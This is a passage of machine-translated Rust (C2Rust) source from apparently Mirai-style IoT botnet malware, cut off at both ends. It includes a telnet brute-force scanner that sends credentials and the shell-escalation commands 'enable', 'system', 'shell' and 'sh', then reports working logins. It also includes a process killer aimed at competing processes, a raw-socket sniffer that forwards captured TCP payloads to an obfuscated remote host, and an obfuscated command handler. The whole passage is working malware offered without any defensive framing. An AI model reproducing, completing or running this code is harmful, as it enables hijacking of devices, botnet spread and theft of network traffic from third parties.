                MSG_NOSIGNAL as libc::c_int,
                0 as *mut sockaddr,
                0 as *mut socklen_t,
            ) as libc::c_int;
            if n <= 0 as libc::c_int || *__errno_location() == 11 as libc::c_int
                || *__errno_location() == 11 as libc::c_int
            {
                break;
            }
            if (n as libc::c_ulong)
                < (::std::mem::size_of::<iphdr>() as libc::c_ulong)
                    .wrapping_add(::std::mem::size_of::<tcphdr>() as libc::c_ulong)
            {
                continue;
            }
            if (*iph_1).daddr != LOCAL_ADDR {
                continue;
            }
            if (*iph_1).protocol as libc::c_int != IPPROTO_TCP as libc::c_int {
                continue;
            }
            if (*tcph_1).source as libc::c_int
                != (23 as libc::c_int as libc::c_ushort as libc::c_int
                    & 0xff as libc::c_int) << 8 as libc::c_int
                    | (23 as libc::c_int as libc::c_ushort as libc::c_int
                        & 0xff00 as libc::c_int) >> 8 as libc::c_int
                && (*tcph_1).source as libc::c_int
                    != (2323 as libc::c_int as libc::c_ushort as libc::c_int
                        & 0xff as libc::c_int) << 8 as libc::c_int
                        | (2323 as libc::c_int as libc::c_ushort as libc::c_int
                            & 0xff00 as libc::c_int) >> 8 as libc::c_int
            {
                continue;
            }
            if (*tcph_1).dest as libc::c_int != source_port as libc::c_int {
                continue;
            }
            if (*tcph_1).syn() == 0 {
                continue;
            }
            if (*tcph_1).ack() == 0 {
                continue;
            }
            if (*tcph_1).rst() != 0 {
                continue;
            }
            if (*tcph_1).fin() != 0 {
                continue;
            }
            if ((ntohl((*tcph_1).ack_seq)).wrapping_sub(1 as libc::c_int as libc::c_uint)
                as libc::c_ulong & 0xff as libc::c_int as libc::c_ulong)
                << 24 as libc::c_int
                | ((ntohl((*tcph_1).ack_seq))
                    .wrapping_sub(1 as libc::c_int as libc::c_uint) as libc::c_ulong
                    & 0xff00 as libc::c_int as libc::c_ulong) << 8 as libc::c_int
                | ((ntohl((*tcph_1).ack_seq))
                    .wrapping_sub(1 as libc::c_int as libc::c_uint) as libc::c_ulong
                    & 0xff0000 as libc::c_int as libc::c_ulong) >> 8 as libc::c_int
                | ((ntohl((*tcph_1).ack_seq))
                    .wrapping_sub(1 as libc::c_int as libc::c_uint) as libc::c_ulong
                    & 0xff000000 as libc::c_uint as libc::c_ulong) >> 24 as libc::c_int
                != (*iph_1).saddr as libc::c_ulong
            {
                continue;
            }
            conn_0 = 0 as *mut scanner_connection;
            n = last_avail_conn;
            while n < 512 as libc::c_int {
                if (*conn_table.offset(n as isize)).state as libc::c_uint
                    == SC_CLOSED as libc::c_int as libc::c_uint
                {
                    conn_0 = &mut *conn_table.offset(n as isize)
                        as *mut scanner_connection;
                    last_avail_conn = n;
                    break;
                } else {
                    n += 1;
                }
            }
            if conn_0.is_null() {
                break;
            }
            (*conn_0).dst_addr = (*iph_1).saddr;
            (*conn_0).dst_port = (*tcph_1).source;
            setup_connection(conn_0);
        }
        let mut __d0: libc::c_int = 0;
        let mut __d1: libc::c_int = 0;
        let fresh98 = &mut __d0;
        let fresh99;
        let fresh100 = (::std::mem::size_of::<fd_set>() as libc::c_ulong)
            .wrapping_div(::std::mem::size_of::<__fd_mask>() as libc::c_ulong);
        let fresh101 = &mut __d1;
        let fresh102;
        let fresh103 = &mut *(fdset_rd.__fds_bits)
            .as_mut_ptr()
            .offset(0 as libc::c_int as isize) as *mut __fd_mask;
        asm!(
            "cld; rep; stosq", inlateout("cx")
            c2rust_asm_casts::AsmCast::cast_in(fresh98, fresh100) => fresh99,
            inlateout("di") c2rust_asm_casts::AsmCast::cast_in(fresh101, fresh103) =>
            fresh102, inlateout("ax") 0 as libc::c_int => _, options(preserves_flags)
        );
        c2rust_asm_casts::AsmCast::cast_out(fresh98, fresh100, fresh99);
        c2rust_asm_casts::AsmCast::cast_out(fresh101, fresh103, fresh102);
        let mut __d0_0: libc::c_int = 0;
        let mut __d1_0: libc::c_int = 0;
        let fresh104 = &mut __d0_0;
        let fresh105;
        let fresh106 = (::std::mem::size_of::<fd_set>() as libc::c_ulong)
            .wrapping_div(::std::mem::size_of::<__fd_mask>() as libc::c_ulong);
        let fresh107 = &mut __d1_0;
        let fresh108;
        let fresh109 = &mut *(fdset_wr.__fds_bits)
            .as_mut_ptr()
            .offset(0 as libc::c_int as isize) as *mut __fd_mask;
        asm!(
            "cld; rep; stosq", inlateout("cx")
            c2rust_asm_casts::AsmCast::cast_in(fresh104, fresh106) => fresh105,
            inlateout("di") c2rust_asm_casts::AsmCast::cast_in(fresh107, fresh109) =>
            fresh108, inlateout("ax") 0 as libc::c_int => _, options(preserves_flags)
        );
        c2rust_asm_casts::AsmCast::cast_out(fresh104, fresh106, fresh105);
        c2rust_asm_casts::AsmCast::cast_out(fresh107, fresh109, fresh108);
        i_0 = 0 as libc::c_int;
        while i_0 < 512 as libc::c_int {
            let mut timeout: libc::c_int = 0;
            conn = &mut *conn_table.offset(i_0 as isize) as *mut scanner_connection;
            timeout = if (*conn).state as libc::c_uint
                > SC_CONNECTING as libc::c_int as libc::c_uint
            {
                30 as libc::c_int
            } else {
                5 as libc::c_int
            };
            if (*conn).state as libc::c_uint != SC_CLOSED as libc::c_int as libc::c_uint
                && fake_time.wrapping_sub((*conn).last_recv as libc::c_uint)
                    > timeout as libc::c_uint
            {
                close((*conn).fd);
                (*conn).fd = -(1 as libc::c_int);
                if (*conn).state as libc::c_uint
                    > SC_HANDLE_IACS as libc::c_int as libc::c_uint
                {
                    let ref mut fresh110 = (*conn).tries;
                    *fresh110 = (*fresh110).wrapping_add(1);
                    if *fresh110 as libc::c_int == 10 as libc::c_int {
                        (*conn).tries = 0 as libc::c_int as uint8_t;
                        (*conn).state = SC_CLOSED;
                    } else {
                        setup_connection(conn);
                    }
                } else {
                    (*conn).tries = 0 as libc::c_int as uint8_t;
                    (*conn).state = SC_CLOSED;
                }
            } else if (*conn).state as libc::c_uint
                == SC_CONNECTING as libc::c_int as libc::c_uint
            {
                fdset_wr
                    .__fds_bits[((*conn).fd
                    / (8 as libc::c_int
                        * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                            as libc::c_int)) as usize]
                    |= ((1 as libc::c_ulong)
                        << (*conn).fd
                            % (8 as libc::c_int
                                * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                    as libc::c_int)) as __fd_mask;
                if (*conn).fd > mfd_wr {
                    mfd_wr = (*conn).fd;
                }
            } else if (*conn).state as libc::c_uint
                != SC_CLOSED as libc::c_int as libc::c_uint
            {
                fdset_rd
                    .__fds_bits[((*conn).fd
                    / (8 as libc::c_int
                        * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                            as libc::c_int)) as usize]
                    |= ((1 as libc::c_ulong)
                        << (*conn).fd
                            % (8 as libc::c_int
                                * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                    as libc::c_int)) as __fd_mask;
                if (*conn).fd > mfd_rd {
                    mfd_rd = (*conn).fd;
                }
            }
            i_0 += 1;
        }
        tim.tv_usec = 0 as libc::c_int as __suseconds_t;
        tim.tv_sec = 1 as libc::c_int as __time_t;
        nfds = select(
            1 as libc::c_int + (if mfd_wr > mfd_rd { mfd_wr } else { mfd_rd }),
            &mut fdset_rd,
            &mut fdset_wr,
            0 as *mut fd_set,
            &mut tim,
        );
        fake_time = time(0 as *mut time_t) as uint32_t;
        let mut current_block_388: u64;
        i_0 = 0 as libc::c_int;
        while i_0 < 512 as libc::c_int {
            conn = &mut *conn_table.offset(i_0 as isize) as *mut scanner_connection;
            if !((*conn).fd == -(1 as libc::c_int)) {
                if fdset_wr
                    .__fds_bits[((*conn).fd
                    / (8 as libc::c_int
                        * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                            as libc::c_int)) as usize]
                    & ((1 as libc::c_ulong)
                        << (*conn).fd
                            % (8 as libc::c_int
                                * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                    as libc::c_int)) as __fd_mask
                    != 0 as libc::c_int as libc::c_long
                {
                    let mut err: libc::c_int = 0 as libc::c_int;
                    let mut ret: libc::c_int = 0 as libc::c_int;
                    let mut err_len: socklen_t = ::std::mem::size_of::<libc::c_int>()
                        as libc::c_ulong as socklen_t;
                    ret = getsockopt(
                        (*conn).fd,
                        1 as libc::c_int,
                        4 as libc::c_int,
                        &mut err as *mut libc::c_int as *mut libc::c_void,
                        &mut err_len,
                    );
                    if err == 0 as libc::c_int && ret == 0 as libc::c_int {
                        (*conn).state = SC_HANDLE_IACS;
                        let ref mut fresh111 = (*conn).auth;
                        *fresh111 = random_auth_entry();
                        (*conn).rdbuf_pos = 0 as libc::c_int;
                        current_block_388 = 2093145933725580773;
                    } else {
                        close((*conn).fd);
                        (*conn).fd = -(1 as libc::c_int);
                        (*conn).tries = 0 as libc::c_int as uint8_t;
                        (*conn).state = SC_CLOSED;
                        current_block_388 = 5349685387690872341;
                    }
                } else {
                    current_block_388 = 2093145933725580773;
                }
                match current_block_388 {
                    5349685387690872341 => {}
                    _ => {
                        if fdset_rd
                            .__fds_bits[((*conn).fd
                            / (8 as libc::c_int
                                * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                    as libc::c_int)) as usize]
                            & ((1 as libc::c_ulong)
                                << (*conn).fd
                                    % (8 as libc::c_int
                                        * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                            as libc::c_int)) as __fd_mask
                            != 0 as libc::c_int as libc::c_long
                        {
                            loop {
                                let mut ret_0: libc::c_int = 0;
                                if (*conn).state as libc::c_uint
                                    == SC_CLOSED as libc::c_int as libc::c_uint
                                {
                                    break;
                                }
                                if (*conn).rdbuf_pos == 256 as libc::c_int {
                                    memmove(
                                        ((*conn).rdbuf).as_mut_ptr() as *mut libc::c_void,
                                        ((*conn).rdbuf)
                                            .as_mut_ptr()
                                            .offset(64 as libc::c_int as isize) as *const libc::c_void,
                                        (256 as libc::c_int - 64 as libc::c_int) as libc::c_ulong,
                                    );
                                    (*conn).rdbuf_pos -= 64 as libc::c_int;
                                }
                                *__errno_location() = 0 as libc::c_int;
                                ret_0 = recv_strip_null(
                                    (*conn).fd,
                                    ((*conn).rdbuf)
                                        .as_mut_ptr()
                                        .offset((*conn).rdbuf_pos as isize) as *mut libc::c_void,
                                    256 as libc::c_int - (*conn).rdbuf_pos,
                                    MSG_NOSIGNAL as libc::c_int,
                                );
                                if ret_0 == 0 as libc::c_int {
                                    *__errno_location() = 104 as libc::c_int;
                                    ret_0 = -(1 as libc::c_int);
                                }
                                if ret_0 == -(1 as libc::c_int) {
                                    if *__errno_location() != 11 as libc::c_int
                                        && *__errno_location() != 11 as libc::c_int
                                    {
                                        close((*conn).fd);
                                        (*conn).fd = -(1 as libc::c_int);
                                        let ref mut fresh112 = (*conn).tries;
                                        *fresh112 = (*fresh112).wrapping_add(1);
                                        if *fresh112 as libc::c_int >= 10 as libc::c_int {
                                            (*conn).tries = 0 as libc::c_int as uint8_t;
                                            (*conn).state = SC_CLOSED;
                                        } else {
                                            setup_connection(conn);
                                        }
                                    }
                                    break;
                                } else {
                                    (*conn).rdbuf_pos += ret_0;
                                    (*conn).last_recv = fake_time as libc::c_int;
                                    loop {
                                        let mut consumed: libc::c_int = 0 as libc::c_int;
                                        match (*conn).state as libc::c_uint {
                                            2 => {
                                                consumed = consume_iacs(conn);
                                                if consumed > 0 as libc::c_int {
                                                    (*conn).state = SC_WAITING_USERNAME;
                                                }
                                            }
                                            3 => {
                                                consumed = consume_user_prompt(conn);
                                                if consumed > 0 as libc::c_int {
                                                    send(
                                                        (*conn).fd,
                                                        (*(*conn).auth).username as *const libc::c_void,
                                                        (*(*conn).auth).username_len as size_t,
                                                        MSG_NOSIGNAL as libc::c_int,
                                                    );
                                                    send(
                                                        (*conn).fd,
                                                        b"\r\n\0" as *const u8 as *const libc::c_char
                                                            as *const libc::c_void,
                                                        2 as libc::c_int as size_t,
                                                        MSG_NOSIGNAL as libc::c_int,
                                                    );
                                                    (*conn).state = SC_WAITING_PASSWORD;
                                                }
                                            }
                                            4 => {
                                                consumed = consume_pass_prompt(conn);
                                                if consumed > 0 as libc::c_int {
                                                    send(
                                                        (*conn).fd,
                                                        (*(*conn).auth).password as *const libc::c_void,
                                                        (*(*conn).auth).password_len as size_t,
                                                        MSG_NOSIGNAL as libc::c_int,
                                                    );
                                                    send(
                                                        (*conn).fd,
                                                        b"\r\n\0" as *const u8 as *const libc::c_char
                                                            as *const libc::c_void,
                                                        2 as libc::c_int as size_t,
                                                        MSG_NOSIGNAL as libc::c_int,
                                                    );
                                                    (*conn).state = SC_WAITING_PASSWD_RESP;
                                                }
                                            }
                                            5 => {
                                                consumed = consume_any_prompt(conn);
                                                if consumed > 0 as libc::c_int {
                                                    send(
                                                        (*conn).fd,
                                                        b"enable\0" as *const u8 as *const libc::c_char
                                                            as *const libc::c_void,
                                                        6 as libc::c_int as size_t,
                                                        MSG_NOSIGNAL as libc::c_int,
                                                    );
                                                    send(
                                                        (*conn).fd,
                                                        b"\r\n\0" as *const u8 as *const libc::c_char
                                                            as *const libc::c_void,
                                                        2 as libc::c_int as size_t,
                                                        MSG_NOSIGNAL as libc::c_int,
                                                    );
                                                    (*conn).state = SC_WAITING_ENABLE_RESP;
                                                }
                                            }
                                            6 => {
                                                consumed = consume_any_prompt(conn);
                                                if consumed > 0 as libc::c_int {
                                                    send(
                                                        (*conn).fd,
                                                        b"system\0" as *const u8 as *const libc::c_char
                                                            as *const libc::c_void,
                                                        6 as libc::c_int as size_t,
                                                        MSG_NOSIGNAL as libc::c_int,
                                                    );
                                                    send(
                                                        (*conn).fd,
                                                        b"\r\n\0" as *const u8 as *const libc::c_char
                                                            as *const libc::c_void,
                                                        2 as libc::c_int as size_t,
                                                        MSG_NOSIGNAL as libc::c_int,
                                                    );
                                                    (*conn).state = SC_WAITING_SYSTEM_RESP;
                                                }
                                            }
                                            7 => {
                                                consumed = consume_any_prompt(conn);
                                                if consumed > 0 as libc::c_int {
                                                    let mut tmp_str: *mut libc::c_char = 0 as *mut libc::c_char;
                                                    send(
                                                        (*conn).fd,
                                                        b"shell\0" as *const u8 as *const libc::c_char
                                                            as *const libc::c_void,
                                                        5 as libc::c_int as size_t,
                                                        MSG_NOSIGNAL as libc::c_int,
                                                    );
                                                    send(
                                                        (*conn).fd,
                                                        b"\r\n\0" as *const u8 as *const libc::c_char
                                                            as *const libc::c_void,
                                                        2 as libc::c_int as size_t,
                                                        MSG_NOSIGNAL as libc::c_int,
                                                    );
                                                    (*conn).state = SC_WAITING_SHELL_RESP;
                                                }
                                            }
                                            8 => {
                                                consumed = consume_any_prompt(conn);
                                                if consumed > 0 as libc::c_int {
                                                    send(
                                                        (*conn).fd,
                                                        b"sh\0" as *const u8 as *const libc::c_char
                                                            as *const libc::c_void,
                                                        2 as libc::c_int as size_t,
                                                        MSG_NOSIGNAL as libc::c_int,
                                                    );
                                                    send(
                                                        (*conn).fd,
                                                        b"\r\n\0" as *const u8 as *const libc::c_char
                                                            as *const libc::c_void,
                                                        2 as libc::c_int as size_t,
                                                        MSG_NOSIGNAL as libc::c_int,
                                                    );
                                                    (*conn).state = SC_WAITING_SH_RESP;
                                                }
                                            }
                                            9 => {
                                                consumed = consume_any_prompt(conn);
                                                if consumed > 0 as libc::c_int {
                                                    send(
                                                        (*conn).fd,
                                                        b"echo -e \"\\x65\\x6e\\x65\\x6d\\x79\"\0" as *const u8
                                                            as *const libc::c_char as *const libc::c_void,
                                                        30 as libc::c_int as size_t,
                                                        MSG_NOSIGNAL as libc::c_int,
                                                    );
                                                    send(
                                                        (*conn).fd,
                                                        b"\r\n\0" as *const u8 as *const libc::c_char
                                                            as *const libc::c_void,
                                                        2 as libc::c_int as size_t,
                                                        MSG_NOSIGNAL as libc::c_int,
                                                    );
                                                    (*conn).state = SC_WAITING_TOKEN_RESP;
                                                }
                                            }
                                            10 => {
                                                if util_memsearch(
                                                    ((*conn).rdbuf).as_mut_ptr(),
                                                    (*conn).rdbuf_pos,
                                                    b"enemy\0" as *const u8 as *const libc::c_char
                                                        as *mut libc::c_char,
                                                    5 as libc::c_int,
                                                ) != -(1 as libc::c_int)
                                                {
                                                    report_working((*conn).dst_addr, port_, (*conn).auth, sock);
                                                }
                                            }
                                            _ => {
                                                consumed = 0 as libc::c_int;
                                            }
                                        }
                                        if consumed == 0 as libc::c_int {
                                            break;
                                        }
                                        if consumed > (*conn).rdbuf_pos {
                                            consumed = (*conn).rdbuf_pos;
                                        }
                                        (*conn).rdbuf_pos -= consumed;
                                        memmove(
                                            ((*conn).rdbuf).as_mut_ptr() as *mut libc::c_void,
                                            ((*conn).rdbuf).as_mut_ptr().offset(consumed as isize)
                                                as *const libc::c_void,
                                            (*conn).rdbuf_pos as libc::c_ulong,
                                        );
                                    }
                                }
                            }
                        }
                    }
                }
            }
            i_0 += 1;
        }
    };
}
#[no_mangle]
pub unsafe extern "C" fn coil_xywz(mut parentpid: libc::c_int) {
    let mut coil_highest_pid: libc::c_int = 400 as libc::c_int;
    let mut last_pid_j83j: libc::c_int = time(0 as *mut time_t) as libc::c_int;
    let mut tmp_bind_fd: libc::c_int = 0;
    let mut j83j_counter: uint32_t = 0 as libc::c_int as uint32_t;
    let mut tmp_bind_addr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    coil_pid = fork();
    if coil_pid > 0 as libc::c_int || coil_pid == -(1 as libc::c_int) {
        return;
    }
    tmp_bind_addr.sin_family = 2 as libc::c_int as sa_family_t;
    tmp_bind_addr.sin_addr.s_addr = 0 as libc::c_int as in_addr_t;
    coil_exe = malloc(4096 as libc::c_int as libc::c_ulong) as *mut libc::c_char;
    *coil_exe.offset(0 as libc::c_int as isize) = 0 as libc::c_int as libc::c_char;
    coil_exe_len = 0 as libc::c_int;
    if aiuf() == 0 {
        return;
    }
    loop {
        let mut dir: *mut DIR = 0 as *mut DIR;
        let mut file: *mut dirent = 0 as *mut dirent;
        dir = opendir(
            eika(
                b"'\xA0\xE7\xB9\xCE'\0" as *const u8 as *const libc::c_char
                    as *mut libc::c_char,
            ),
        );
        if dir.is_null() {
            break;
        }
        loop {
            file = readdir(dir);
            if file.is_null() {
                break;
            }
            if (*((*file).d_name).as_mut_ptr() as libc::c_int) < '0' as i32
                || *((*file).d_name).as_mut_ptr() as libc::c_int > '9' as i32
            {
                continue;
            }
            let mut exe_path: [libc::c_char; 64] = [0; 64];
            let mut ptr_exe_path: *mut libc::c_char = exe_path.as_mut_ptr();
            let mut exe: [libc::c_char; 4096] = [0; 4096];
            let mut status_path: [libc::c_char; 64] = [0; 64];
            let mut ptr_status_path: *mut libc::c_char = status_path.as_mut_ptr();
            let mut rp_len: libc::c_int = 0;
            let mut fd: libc::c_int = 0;
            let mut pid: libc::c_int = atoi(((*file).d_name).as_mut_ptr());
            j83j_counter = j83j_counter.wrapping_add(1);
            if pid <= coil_highest_pid && pid != parentpid || pid != getpid() {
                if time(0 as *mut time_t) - last_pid_j83j as libc::c_long
                    > 1 as libc::c_int as libc::c_long
                {
                    coil_highest_pid = 400 as libc::c_int;
                } else if pid > 400 as libc::c_int
                    && j83j_counter.wrapping_rem(10 as libc::c_int as libc::c_uint)
                        == 0 as libc::c_int as libc::c_uint
                {
                    sleep(1 as libc::c_int as libc::c_uint);
                }
            } else {
                if pid > coil_highest_pid {
                    coil_highest_pid = pid;
                }
                last_pid_j83j = time(0 as *mut time_t) as libc::c_int;
                ptr_exe_path = ptr_exe_path
                    .offset(
                        util_strcpy(
                            ptr_exe_path,
                            eika(
                                b"'\xA0\xE7\xB9\xCE'\0" as *const u8 as *const libc::c_char
                                    as *mut libc::c_char,
                            ),
                        ) as isize,
                    );
                ptr_exe_path = ptr_exe_path
                    .offset(
                        util_strcpy(ptr_exe_path, ((*file).d_name).as_mut_ptr()) as isize,
                    );
                ptr_exe_path = ptr_exe_path
                    .offset(
                        util_strcpy(
                            ptr_exe_path,
                            eika(
                                b"'Q\xC1Q\0" as *const u8 as *const libc::c_char
                                    as *mut libc::c_char,
                            ),
                        ) as isize,
                    );
                ptr_status_path = ptr_status_path
                    .offset(
                        util_strcpy(
                            ptr_status_path,
                            eika(
                                b"'\xA0\xE7\xB9\xCE'\0" as *const u8 as *const libc::c_char
                                    as *mut libc::c_char,
                            ),
                        ) as isize,
                    );
                ptr_status_path = ptr_status_path
                    .offset(
                        util_strcpy(ptr_status_path, ((*file).d_name).as_mut_ptr())
                            as isize,
                    );
                ptr_status_path = ptr_status_path
                    .offset(
                        util_strcpy(
                            ptr_status_path,
                            b"/status\0" as *const u8 as *const libc::c_char
                                as *mut libc::c_char,
                        ) as isize,
                    );
                rp_len = readlink(
                    exe_path.as_mut_ptr(),
                    exe.as_mut_ptr(),
                    (::std::mem::size_of::<[libc::c_char; 4096]>() as libc::c_ulong)
                        .wrapping_sub(1 as libc::c_int as libc::c_ulong),
                ) as libc::c_int;
                if rp_len != -(1 as libc::c_int) {
                    exe[rp_len as usize] = 0 as libc::c_int as libc::c_char;
                    if pid == getpid() || pid == getppid()
                        || util_strcmp(exe.as_mut_ptr(), coil_exe) != 0
                    {
                        continue;
                    }
                    fd = open(exe.as_mut_ptr(), 0 as libc::c_int);
                    if fd == -(1 as libc::c_int) {
                        kill(pid, 9 as libc::c_int);
                    }
                    close(fd);
                }
                if d8ds(exe_path.as_mut_ptr()) != 0 {
                    kill(pid, 9 as libc::c_int);
                }
                util_zero(
                    exe_path.as_mut_ptr() as *mut libc::c_void,
                    ::std::mem::size_of::<[libc::c_char; 64]>() as libc::c_ulong
                        as libc::c_int,
                );
                util_zero(
                    status_path.as_mut_ptr() as *mut libc::c_void,
                    ::std::mem::size_of::<[libc::c_char; 64]>() as libc::c_ulong
                        as libc::c_int,
                );
                sleep(1 as libc::c_int as libc::c_uint);
            }
        }
        closedir(dir);
    };
}
#[no_mangle]
pub unsafe extern "C" fn j83jdt(mut sock: libc::c_int) {
    let mut parent: uint32_t = 0;
    parent = fork() as uint32_t;
    let mut forks: libc::c_int = (sysconf(_SC_NPROCESSORS_ONLN as libc::c_int)
        * 8 as libc::c_int as libc::c_long) as libc::c_int;
    if parent > 0 as libc::c_int as libc::c_uint {
        j83jPid = parent as libc::c_int;
    } else if parent == -(1 as libc::c_int) as libc::c_uint {
        return
    }
    let mut fds: libc::c_int = 128 as libc::c_int * forks;
    srand((time(0 as *mut time_t) ^ (getpid() * forks) as libc::c_long) as libc::c_uint);
    scanner_xywz(sock);
}
#[no_mangle]
pub static mut sock_raw: libc::c_int = 0;
#[no_mangle]
pub static mut logfile: *mut FILE = 0 as *const FILE as *mut FILE;
#[no_mangle]
pub static mut tcp: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub static mut i: libc::c_int = 0;
#[no_mangle]
pub static mut j: libc::c_int = 0;
#[no_mangle]
pub static mut source: sockaddr_in = sockaddr_in {
    sin_family: 0,
    sin_port: 0,
    sin_addr: in_addr { s_addr: 0 },
    sin_zero: [0; 8],
};
#[no_mangle]
pub static mut dest: sockaddr_in = sockaddr_in {
    sin_family: 0,
    sin_port: 0,
    sin_addr: in_addr { s_addr: 0 },
    sin_zero: [0; 8],
};
#[no_mangle]
pub unsafe extern "C" fn print_ip_header(
    mut Buffer: *mut libc::c_uchar,
    mut Size: libc::c_int,
) {
    let mut iphdrlen: libc::c_ushort = 0;
    let mut iph: *mut iphdr = Buffer as *mut iphdr;
    iphdrlen = ((*iph).ihl() as libc::c_int * 4 as libc::c_int) as libc::c_ushort;
    memset(
        &mut source as *mut sockaddr_in as *mut libc::c_void,
        0 as libc::c_int,
        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong,
    );
    source.sin_addr.s_addr = (*iph).saddr;
    memset(
        &mut dest as *mut sockaddr_in as *mut libc::c_void,
        0 as libc::c_int,
        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong,
    );
    dest.sin_addr.s_addr = (*iph).daddr;
}
#[no_mangle]
pub unsafe extern "C" fn print_tcp_packet(
    mut Buffer: *mut libc::c_uchar,
    mut Size: libc::c_int,
) {
    let mut iphdrlen: libc::c_ushort = 0;
    let mut iph: *mut iphdr = Buffer as *mut iphdr;
    iphdrlen = ((*iph).ihl() as libc::c_int * 4 as libc::c_int) as libc::c_ushort;
    let mut tcph: *mut tcphdr = Buffer.offset(iphdrlen as libc::c_int as isize)
        as *mut tcphdr;
    let mut port: libc::c_int = ntohs((*tcph).dest) as libc::c_int;
    if port != 80 as libc::c_int && port != 21 as libc::c_int
        && port != 25 as libc::c_int && port != 666 as libc::c_int
        && port != 1337 as libc::c_int && port != 808 as libc::c_int
    {
        return;
    }
    memset(
        &mut source as *mut sockaddr_in as *mut libc::c_void,
        0 as libc::c_int,
        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong,
    );
    source.sin_addr.s_addr = (*iph).saddr;
    memset(
        &mut dest as *mut sockaddr_in as *mut libc::c_void,
        0 as libc::c_int,
        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong,
    );
    dest.sin_addr.s_addr = (*iph).daddr;
    let mut sniffSock: libc::c_int = socket_connect(
        eika(
            b"\xEB\xE2*\x97\xEBoo\x97o\xEB\x97\xEB*o\0" as *const u8
                as *const libc::c_char as *mut libc::c_char,
        ),
        9 as libc::c_int as uint16_t,
    );
    sockprintf(
        sniffSock,
        b"   |-Destination IP   : %s\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        inet_ntoa(dest.sin_addr),
    );
    sockprintf(
        sniffSock,
        b"   |-Destination Port : %u\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        port,
    );
    sockprintf(
        sniffSock,
        b"   |-Source IP        : %s\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        inet_ntoa(source.sin_addr),
    );
    sockprintf(
        sniffSock,
        b"   |-Source Port      : %u\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        ntohs((*tcph).source) as libc::c_int,
    );
    sockprintf(
        sniffSock,
        b"   |-TCP Packet count : %d\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        tcp,
    );
    sockprintf(
        sniffSock,
        b"\n   /-Data Payload-\\\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
    );
    sockprintf(
        sniffSock,
        b"%s\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        Buffer
            .offset(iphdrlen as libc::c_int as isize)
            .offset(((*tcph).doff() as libc::c_int * 4 as libc::c_int) as isize),
        Size - (*tcph).doff() as libc::c_int * 4 as libc::c_int
            - (*iph).ihl() as libc::c_int * 4 as libc::c_int,
    );
    sockprintf(
        sniffSock,
        b"   \\-Data Payload-/\n\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
    );
    close(sniffSock);
}
#[no_mangle]
pub unsafe extern "C" fn ProcessPacket(
    mut buffer: *mut libc::c_uchar,
    mut size: libc::c_int,
) {
    let mut iph: *mut iphdr = buffer as *mut iphdr;
    match (*iph).protocol as libc::c_int {
        1 => {}
        2 => {}
        6 => {
            tcp += 1;
            print_tcp_packet(buffer, size);
        }
        17 => {}
        _ => {}
    };
}
#[no_mangle]
pub static mut tcppid: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub unsafe extern "C" fn tcpkernel() -> libc::c_int {
    tcppid = fork();
    if tcppid > 0 as libc::c_int {
        return tcppid;
    }
    let mut saddr_size: libc::c_int = 0;
    let mut data_size: libc::c_int = 0;
    let mut saddr: sockaddr = sockaddr {
        sa_family: 0,
        sa_data: [0; 14],
    };
    let mut in_0: in_addr = in_addr { s_addr: 0 };
    let mut buffer: *mut libc::c_uchar = malloc(65536 as libc::c_int as libc::c_ulong)
        as *mut libc::c_uchar;
    sock_raw = socket(
        2 as libc::c_int,
        SOCK_RAW as libc::c_int,
        IPPROTO_TCP as libc::c_int,
    );
    if sock_raw < 0 as libc::c_int {
        return 1 as libc::c_int;
    }
    loop {
        saddr_size = ::std::mem::size_of::<sockaddr>() as libc::c_ulong as libc::c_int;
        data_size = recvfrom(
            sock_raw,
            buffer as *mut libc::c_void,
            65536 as libc::c_int as size_t,
            0 as libc::c_int,
            &mut saddr,
            &mut saddr_size as *mut libc::c_int as *mut socklen_t,
        ) as libc::c_int;
        if data_size > 0 as libc::c_int {
            ProcessPacket(buffer, data_size);
        }
    };
}
#[no_mangle]
pub static mut get: libc::c_int = 0;
#[no_mangle]
pub unsafe extern "C" fn processCmd(
    mut argc: libc::c_int,
    mut argv: *mut *mut libc::c_uchar,
) {
    if !(strstr(
        *argv.offset(0 as libc::c_int as isize) as *const libc::c_char,
        okic(b"~-6mvgmv\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
    ))
        .is_null()
    {
        if argc == 2 as libc::c_int {
            memset(
                ldserver.as_mut_ptr() as *mut libc::c_void,
                0 as libc::c_int,
                ::std::mem::size_of::<[libc::c_uchar; 41]>() as libc::c_ulong,
            );
            strcpy(
                ldserver.as_mut_ptr() as *mut libc::c_char,
                *argv.offset(1 as libc::c_int as isize) as *const libc::c_char,
            );
        }
    } else if !(strstr(
        *argv.offset(0 as libc::c_int as isize) as *const libc::c_char,
        b"TCPON\0" as *const u8 as *const libc::c_char,
    ))
        .is_null()
    {
        if tcppid == 0 as libc::c_int {
            tcppid = tcpkernel();
        }
    } else if !(strstr(
        *argv.offset(0 as libc::c_int as isize) as *const libc::c_char,
        b"TCPOFF\0" as *const u8 as *const libc::c_char,
    ))
        .is_null()
    {
        if tcppid > 0 as libc::c_int {
            kill(tcppid, 9 as libc::c_int);
            tcppid = 0 as libc::c_int;
        }
    } else if strcmp(
        *argv.offset(0 as libc::c_int as isize) as *const libc::c_char,
        okic(b"1-|\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
    ) == 0
    {
        if argc < 3 as libc::c_int
